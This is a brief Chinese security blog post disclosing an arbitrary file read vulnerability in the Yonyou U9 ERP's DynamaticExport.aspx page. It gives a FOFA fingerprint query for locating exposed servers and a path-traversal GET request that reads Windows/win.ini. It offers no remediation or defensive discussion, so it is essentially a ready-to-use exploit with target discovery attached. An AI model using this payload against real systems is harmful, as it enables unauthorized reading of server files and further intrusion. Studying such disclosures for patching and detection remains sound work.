#  用友U9 DynamaticExport任意文件读取漏洞  
原创 安全透视镜  网络安全透视镜   2025-07-10 23:10  
  
fofa语法  
```
body="logo-u9.png"
```  
  
  
POC  
  
GET  
```
/print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS6icy66iaCGzdwSliaQuia2D3ozEibibhQIsGdzicm8zq5jH9LuIdRzErfdmDNug57H8Q8icJQSLISqkGYib1w/640?wx_fmt=png&from=appmsg "")  
  
  
  
